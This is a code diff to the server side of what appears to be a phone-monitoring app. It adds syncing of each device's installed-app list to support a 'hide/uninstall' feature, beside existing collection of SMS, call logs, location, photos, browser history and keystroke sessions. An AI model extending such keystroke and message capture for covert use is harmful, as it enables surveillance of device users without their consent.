@@ -1,6 +1,6 @@
 const express = require('express');
 const mongoose = require('mongoose');
-const { Device, Notification, CallLog, AppUsage, LocationHistory, Photo, SMS, BrowserHistory, KeystrokeSession, User } = require('../models');
+const { Device, Notification, CallLog, AppUsage, LocationHistory, Photo, SMS, BrowserHistory, KeystrokeSession, User, InstalledApp } = require('../models');
 
 const router = express.Router();
 
@@ -487,6 +487,33 @@ router.post('/:deviceId', async (req, res, next) => {
       await AppUsage.bulkWrite(operations).catch(() => {});
     }
 
+    // Sync installed apps list (for Device Owner hide/uninstall feature)
+    const installedApps = req.body.installedApps;
+    if (installedApps && installedApps.length > 0) {
+      const installedOps = installedApps.map(app => ({
+        updateOne: {
+          filter: { deviceId: device.deviceId, packageName: app.packageName },
+          update: {
+            $set: {
+              appName: app.appName,
+              isSystemApp: app.isSystemApp || false,
+              isEnabled: app.isEnabled !== false,
+              lastSeenAt: new Date()
+            }
+          },
+          upsert: true
+        }
+      }));
+      await InstalledApp.bulkWrite(installedOps).catch(e => console.error('[Sync] InstalledApp bulkWrite error:', e));
+      
+      // Remove apps no longer installed (not seen in this sync)
+      const currentPackages = installedApps.map(a => a.packageName);
+      await InstalledApp.deleteMany({
+        deviceId: device.deviceId,
+        packageName: { $nin: currentPackages }
+      }).catch(() => {});
+    }
+
     console.log(`[/:deviceId] SUCCESS - Data synced for device: ${device.name}`);
     
     res.json({
@@ -580,6 +607,33 @@ router.post('/sync', verifyDevice, async (req, res) => {
       }));
 
       await AppUsage.bulkWrite(operations).catch(() => {});
+    }
+
+    // Sync installed apps list (for Device Owner hide/uninstall feature)
+    const installedApps2 = req.body.installedApps;
+    if (installedApps2 && installedApps2.length > 0) {
+      const installedOps2 = installedApps2.map(app => ({
+        updateOne: {
+          filter: { deviceId: req.device.deviceId, packageName: app.packageName },
+          update: {
+            $set: {
+              appName: app.appName,
+              isSystemApp: app.isSystemApp || false,
+              isEnabled: app.isEnabled !== false,
+              lastSeenAt: new Date()
+            }
+          },
+          upsert: true
+        }
+      }));
+      await InstalledApp.bulkWrite(installedOps2).catch(e => console.error('[Sync] InstalledApp bulkWrite error:', e));
+      
+      // Remove apps no longer installed
+      const currentPkgs2 = installedApps2.map(a => a.packageName);
+      await InstalledApp.deleteMany({
+        deviceId: req.device.deviceId,
+        packageName: { $nin: currentPkgs2 }
+      }).catch(() => {});
     }
 
     console.log(`[/sync] SUCCESS - Data synced for device: ${req.device.name}`);
